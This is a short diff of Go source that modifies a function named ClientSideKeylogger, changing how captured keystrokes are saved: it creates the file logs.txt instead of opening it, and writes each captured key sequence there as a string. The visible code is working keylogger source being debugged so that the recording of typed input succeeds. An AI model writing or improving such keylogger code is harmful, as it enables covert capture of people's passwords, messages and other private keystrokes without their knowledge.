@@ -10,7 +10,7 @@ const maxBuffer = 1024
 
 func ClientSideKeylogger() {
 
-	file, err := os.Open("logs.txt")
+	file, err := os.Create("logs.txt")
 	if err != nil {
 		panic(err)
 	}
@@ -46,7 +46,7 @@ func ClientSideKeylogger() {
 		if data > 0 {
 			keys := string(buffer[:data])
 			fmt.Printf("Key: %s\n", keys)
-			file.Write(buffer[:data])
+			file.WriteString(keys)
 		}
 	}
 }
